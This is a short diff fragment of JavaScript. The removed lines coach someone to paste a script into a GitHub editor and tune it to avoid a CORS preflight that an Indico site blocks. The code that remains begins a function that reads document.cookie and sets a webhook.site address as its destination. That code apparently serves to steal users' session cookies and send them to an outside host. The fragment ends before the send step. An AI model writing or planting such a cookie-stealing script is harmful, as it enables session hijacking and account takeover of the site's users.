@@ -1,5 +1,3 @@
-That's the wrong version — it uses application/json which triggers a CORS preflight that indico blocks. You're in the GitHub editor now — select all, delete, paste this instead:
-
 (function () {
   var WEBHOOK = 'https://webhook.site/d4a92c22-be5c-4ee4-86c1-70ac738e3d61';
   var cookies = document.cookie;
